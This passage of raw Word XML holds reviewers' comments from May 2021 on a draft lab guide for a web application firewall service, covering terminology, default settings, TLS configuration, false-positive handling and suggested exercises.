          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="31" w:name="_@_DEA84799DEDB470AA2EAB97C4DB59F10Z"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
      <w:r w:rsidRPr="31F0552B">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   Website profiles are not enabled by default. Also, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> not recommended to enable them with wildcard matches anyway. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="32" w:author="Aravindan Anandan" w:date="2021-05-25T21:38:00Z" w:initials="AA">
    <w:p w14:paraId="2CC6D830" w14:textId="64412CA5" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="33" w:name="_@_4C03CA263957415DBB4544F753D90296Z"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
      <w:r w:rsidRPr="31F0552B">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   Website profiles are not enabled by default. Also, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> not recommended to enable them with wildcard matches anyway. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="34" w:author="Aravindan Anandan" w:date="2021-05-25T21:37:00Z" w:initials="AA">
    <w:p w14:paraId="50E955A1" w14:textId="3406DC95" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="35" w:name="_@_5783C7F2D03A4EF284B2D4EA711B6B0FZ"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="35"/>
      <w:r w:rsidRPr="31F0552B">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   Website profiles are not enabled by default. Also, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> not recommended to enable them with wildcard matches anyway. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="45" w:author="Aravindan Anandan" w:date="2021-05-25T21:42:00Z" w:initials="AA">
    <w:p w14:paraId="3DA0B8D4" w14:textId="44F7EB49" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="46" w:name="_@_A2AF48E190BE4831A1B16D27F287264EZ"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="46"/>
      <w:r w:rsidRPr="31F0552B">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Something you can consider: Move the attacks section to the top where someone accesses the backend server for the first time after receiving the email. In the real world, once </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WaaS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is setup to protect the application, we recommend that the backend server allow any access from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WaaS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> sources only, and so it does not make sense to access the server directly anymore. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> also another point we need to capture for prescribing best practices.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="68" w:author="Aravindan Anandan" w:date="2021-05-26T12:59:00Z" w:initials="AA">
    <w:p w14:paraId="7F717939" w14:textId="460A1F69" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="69" w:name="_@_2F409A13333C476BA5FBB2746F7E9E8FZ"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="69"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> highlight this text</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="70" w:author="Aravindan Anandan" w:date="2021-05-26T13:02:00Z" w:initials="AA">
    <w:p w14:paraId="271DE759" w14:textId="781D2173" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="71" w:name="_@_8FAD448AD81B406C8FEC43CB2ACB5819Z"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="71"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Why should the user </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>confiigure</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> this exception manually, instead of marking it as a false positive and accepting the configuration change for the policy </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>fix ??</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Also ,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> this change requires the whole attack group to be disabled for the parameter rather than excluding the specific erroneous pattern, which is not good practice.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="72" w:author="Aravindan Anandan" w:date="2021-05-26T12:58:00Z" w:initials="AA">
    <w:p w14:paraId="15B75B20" w14:textId="301E6D76" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="73" w:name="_@_FDE67D589BA04CA3A4FAA6053384CAEFZ"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="73"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> should be Application Profiles</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="76" w:author="Aravindan Anandan" w:date="2021-05-26T12:54:00Z" w:initials="AA">
    <w:p w14:paraId="6CA0004F" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="77" w:name="_@_C268ED3CFEF64CD089984C54090985A0Z"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="77"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> you may need to mention that the user not perform other tasks such as deleting the user or the resettting of the comments etc, which can potentially block access</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="82" w:author="Tushar Richabadas" w:date="2021-05-07T16:48:00Z" w:initials="TR">
    <w:p w14:paraId="494D1F5A" w14:textId="52083E37" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t>Consider adding exercises on:</w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAABC17" w14:textId="108626A1" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">- Blocking a fake </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>googlebot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="289B371B" w14:textId="41857506" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t>- App profiles</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAEB851" w14:textId="4F55233D" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t>- CAPTCHA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE43F3F" w14:textId="591931AF" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t>- URL encryption</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1292CF4C" w14:textId="4157CFAE" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t>- Modifying custom block pages</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="95" w:author="Aravindan Anandan" w:date="2021-05-07T19:37:00Z" w:initials="AA">
    <w:p w14:paraId="47D78F1A" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="007B4A52">
      <w:r>
        <w:t xml:space="preserve">The current default </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> configuration has tls1.3 enabled on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WaaS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. this can cause problems if we are using a different domain name to access the application. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>So</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> we need to introduce another step to disable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 1.3 in the configuration.</w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="98" w:author="Aravindan Anandan" w:date="2021-05-26T13:07:00Z" w:initials="AA">
    <w:p w14:paraId="46614A17" w14:textId="64A141E3" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="100" w:name="_@_D38338B1342E4B2A9917FEE0AA341D7FZ"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="100"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Can this part be avoided somehow. This looks more like a bug than a "required configuration change"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="99" w:author="Brett" w:date="2021-05-26T11:32:00Z" w:initials="BW">
    <w:p w14:paraId="59D816D0" w14:textId="498D8F31" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">it </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>has to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> be beta region for json to work</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="101" w:author="Tushar Richabadas" w:date="2021-05-07T16:41:00Z" w:initials="TR">
    <w:p w14:paraId="3399C0AC" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="007B4A52">
      <w:r>
        <w:t>We should use one term consistently across the document, preferably WAF-as-a-Service.</w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="102" w:author="Brett" w:date="2021-05-07T08:36:00Z" w:initials="BW">
    <w:p w14:paraId="2C81535D" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="007B4A52">
      <w:r>
        <w:t xml:space="preserve">Yes, thank you and I will do that now.  However, because the user is going to run across the term </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WAFaaS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or WAAS I am going to add a small note in the introduction that one may see the solution referred to in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>it's</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> short forms </w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="103" w:author="Brett" w:date="2021-05-13T08:58:00Z" w:initials="BW">
    <w:p w14:paraId="7867D832" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="007B4A52">
      <w:r>
        <w:t xml:space="preserve">Now all occurrences are: WAF-as-a-Service </w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="105" w:author="Aravindan Anandan" w:date="2021-05-25T21:49:00Z" w:initials="AA">
    <w:p w14:paraId="7F557026" w14:textId="456D535F" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="106" w:name="_@_E9049175BE21435E949009D2E40406E6Z"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="106"/>
      <w:r w:rsidRPr="31F0552B">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> This section probably needs some explanation about the schema and what the need is for someone to import the spec. More importantly, we need to specifically state that </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>all of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the following configuration can be done manually incase </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> not possible to get the specification file for some reason. There are many legacy apps out there that may not follow </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>openapi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> based schema.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="107" w:author="Aravindan Anandan" w:date="2021-05-26T13:12:00Z" w:initials="AA">
    <w:p w14:paraId="1F41878C" w14:textId="02F605D3" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="108" w:name="_@_6F86E39A1AA740B694B117C02B959427Z"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="108"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Needs to be explained. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> not one profile.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="109" w:author="Brett" w:date="2021-05-26T11:36:00Z" w:initials="BW">
    <w:p w14:paraId="28AF4B2F" w14:textId="1E99B6E6" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:t>done</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="116" w:author="Aravindan Anandan" w:date="2021-05-25T21:51:00Z" w:initials="AA">
    <w:p w14:paraId="2FFF9E28" w14:textId="0269CBA5" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:bwolmarans@barracuda.com"</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="117" w:name="_@_C3D81704B5A649BDB37F7AC31AC7CDAFZ"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:bookmarkEnd w:id="117"/>
      <w:r w:rsidRPr="31F0552B">
        <w:rPr>
          <w:rStyle w:val="Mention"/>
          <w:noProof/>
        </w:rPr>
        <w:t>@Brett Wolmarans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> we may also add other resources that may be useful for attendees, such as the forum link, blogs and the resources section in the official website.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="118" w:author="Brett" w:date="2021-05-26T11:38:00Z" w:initials="BW">
    <w:p w14:paraId="5F115A3B" w14:textId="52CF0C47" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">thanks for this suggestion, I am going with the opposite view and keep it simple with these two links and hope they click on </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>both of them</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
